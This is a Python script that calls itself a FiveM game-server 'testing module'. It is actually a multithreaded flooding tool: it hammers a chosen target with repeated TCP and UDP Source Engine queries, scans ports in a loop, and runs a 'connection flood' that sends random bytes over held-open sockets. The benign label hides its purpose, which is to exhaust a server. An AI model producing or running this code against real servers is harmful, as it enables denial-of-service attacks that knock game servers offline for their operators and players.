#!/usr/bin/env python3
"""
FiveM Server Testing Module
Tests FiveM game server connectivity and performance
"""

import socket
import threading
import time
import random
import json
import struct
from colorama import Fore, Style

class FiveMTester:
    def __init__(self, target, port, threads=10, duration=60, verbose=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.verbose = verbose
        self.running = False
        self.connections_attempted = 0
        self.successful_connections = 0
        self.failed_connections = 0
        
        # FiveM specific ports
        self.fivem_ports = [30120, 30121, 30122, 30123, 30124, 30125]
        
        # FiveM query types
        self.query_types = [
            'info',
            'players',
            'rules',
            'ping'
        ]

    def fivem_handshake(self):
        """Perform FiveM server handshake"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # Connect to FiveM server
            sock.connect((self.target, self.port))
            self.connections_attempted += 1
            
            # FiveM handshake packet
            handshake = b'\xff\xff\xff\xffTSource Engine Query\x00'
            sock.send(handshake)
            
            # Receive response
            response = sock.recv(1024)
            
            if response and len(response) > 4:
                self.successful_connections += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] FiveM handshake successful on {self.target}:{self.port}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Response length: {len(response)} bytes{Style.RESET_ALL}")
            else:
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] FiveM handshake failed on {self.target}:{self.port}{Style.RESET_ALL}")
            
            sock.close()
            
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] FiveM handshake error: {e}{Style.RESET_ALL}")

    def fivem_query(self, query_type='info'):
        """Query FiveM server information"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            sock.connect((self.target, self.port))
            self.connections_attempted += 1
            
            # FiveM query packet
            if query_type == 'info':
                query = b'\xff\xff\xff\xffTSource Engine Query\x00'
            elif query_type == 'players':
                query = b'\xff\xff\xff\xffU'
            elif query_type == 'rules':
                query = b'\xff\xff\xff\xffV'
            else:
                query = b'\xff\xff\xff\xffTSource Engine Query\x00'
            
            sock.send(query)
            
            # Receive response
            response = sock.recv(4096)
            
            if response and len(response) > 4:
                self.successful_connections += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] FiveM {query_type} query successful on {self.target}:{self.port}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Response: {response[:100]}...{Style.RESET_ALL}")
            else:
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] FiveM {query_type} query failed on {self.target}:{self.port}{Style.RESET_ALL}")
            
            sock.close()
            
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] FiveM {query_type} query error: {e}{Style.RESET_ALL}")

    def fivem_udp_query(self):
        """Perform UDP query to FiveM server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(10)
            
            # FiveM UDP query packet
            query = b'\xff\xff\xff\xffTSource Engine Query\x00'
            
            sock.sendto(query, (self.target, self.port))
            self.connections_attempted += 1
            
            # Receive response
            response, addr = sock.recvfrom(4096)
            
            if response and len(response) > 4:
                self.successful_connections += 1
                if self.verbose:
                    print(f"{Fore.GREEN}[+] FiveM UDP query successful on {self.target}:{self.port}{Style.RESET_ALL}")
                    print(f"{Fore.CYAN}[*] Response from {addr}: {len(response)} bytes{Style.RESET_ALL}")
            else:
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.YELLOW}[!] FiveM UDP query failed on {self.target}:{self.port}{Style.RESET_ALL}")
            
            sock.close()
            
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] FiveM UDP query error: {e}{Style.RESET_ALL}")

    def fivem_port_scan(self):
        """Scan for FiveM servers on common ports"""
        for port in self.fivem_ports:
            if not self.running:
                break
                
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                result = sock.connect_ex((self.target, port))
                self.connections_attempted += 1
                
                if result == 0:
                    self.successful_connections += 1
                    if self.verbose:
                        print(f"{Fore.GREEN}[+] FiveM server found on port {port}{Style.RESET_ALL}")
                    
                    # Try to get server info
                    try:
                        handshake = b'\xff\xff\xff\xffTSource Engine Query\x00'
                        sock.send(handshake)
                        response = sock.recv(1024)
                        if response:
                            if self.verbose:
                                print(f"{Fore.CYAN}[*] Server info on port {port}: {response[:50]}...{Style.RESET_ALL}")
                    except:
                        pass
                else:
                    self.failed_connections += 1
                    if self.verbose:
                        print(f"{Fore.RED}[-] No FiveM server on port {port}{Style.RESET_ALL}")
                
                sock.close()
                
            except Exception as e:
                self.connections_attempted += 1
                self.failed_connections += 1
                if self.verbose:
                    print(f"{Fore.RED}[-] Port {port} scan error: {e}{Style.RESET_ALL}")

    def fivem_connection_flood(self):
        """Flood FiveM server with connections"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            sock.connect((self.target, self.port))
            self.connections_attempted += 1
            
            # Keep connection alive and send data
            start_time = time.time()
            while self.running and (time.time() - start_time) < 30:
                try:
                    # Send random data
                    data = random.randbytes(random.randint(64, 512))
                    sock.send(data)
                except:
                    break
            
            sock.close()
            self.successful_connections += 1
            
            if self.verbose:
                print(f"{Fore.GREEN}[+] FiveM connection flood completed{Style.RESET_ALL}")
                
        except Exception as e:
            self.connections_attempted += 1
            self.failed_connections += 1
            if self.verbose:
                print(f"{Fore.RED}[-] FiveM connection flood error: {e}{Style.RESET_ALL}")

    def handshake_worker(self):
        """Handshake worker thread"""
        while self.running:
            self.fivem_handshake()

    def query_worker(self):
        """Query worker thread"""
        while self.running:
            query_type = random.choice(self.query_types)
            self.fivem_query(query_type)

    def udp_worker(self):
        """UDP query worker thread"""
        while self.running:
            self.fivem_udp_query()

    def flood_worker(self):
        """Connection flood worker thread"""
        while self.running:
            self.fivem_connection_flood()

    def port_scan_worker(self):
        """Port scan worker thread"""
        while self.running:
            self.fivem_port_scan()

    def run_tests(self):
        """Run all FiveM tests"""
        print(f"{Fore.CYAN}[*] Starting FiveM server tests against {self.target}:{self.port}{Style.RESET_ALL}")
        
        self.running = True
        start_time = time.time()
        
        # Start handshake threads
        handshake_threads = []
        for _ in range(self.threads // 3):
            thread = threading.Thread(target=self.handshake_worker)
            thread.daemon = True
            thread.start()
            handshake_threads.append(thread)
        
        # Start query threads
        query_threads = []
        for _ in range(self.threads // 3):
            thread = threading.Thread(target=self.query_worker)
            thread.daemon = True
            thread.start()
            query_threads.append(thread)
        
        # Start UDP query threads
        udp_threads = []
        for _ in range(min(3, self.threads // 4)):
            thread = threading.Thread(target=self.udp_worker)
            thread.daemon = True
            thread.start()
            udp_threads.append(thread)
        
        # Start connection flood threads
        flood_threads = []
        for _ in range(min(2, self.threads // 5)):
            thread = threading.Thread(target=self.flood_worker)
            thread.daemon = True
            thread.start()
            flood_threads.append(thread)
        
        # Start port scan thread
        scan_thread = threading.Thread(target=self.port_scan_worker)
        scan_thread.daemon = True
        scan_thread.start()
        
        # Monitor progress
        try:
            while time.time() - start_time < self.duration:
                elapsed = time.time() - start_time
                remaining = self.duration - elapsed
                
                print(f"\r{Fore.YELLOW}[*] Progress: {elapsed:.1f}s/{self.duration}s | "
                      f"Attempts: {self.connections_attempted} | "
                      f"Success: {self.successful_connections} | "
                      f"Failed: {self.failed_connections} | "
                      f"Remaining: {remaining:.1f}s{Style.RESET_ALL}", end="")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Test interrupted{Style.RESET_ALL}")
        
        # Stop all threads
        self.running = False
        
        # Wait for threads to finish
        all_threads = handshake_threads + query_threads + udp_threads + flood_threads + [scan_thread]
        for thread in all_threads:
            thread.join(timeout=1)
        
        # Print final results
        print(f"\n{Fore.GREEN}[+] FiveM server test completed{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Total connection attempts: {self.connections_attempted}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Successful connections: {self.successful_connections}{Style.RESET_ALL}")
        print(f"{Fore.RED}Failed connections: {self.failed_connections}{Style.RESET_ALL}")
        
        if self.connections_attempted > 0:
            success_rate = (self.successful_connections / self.connections_attempted) * 100
            print(f"{Fore.YELLOW}Success rate: {success_rate:.1f}%{Style.RESET_ALL}") 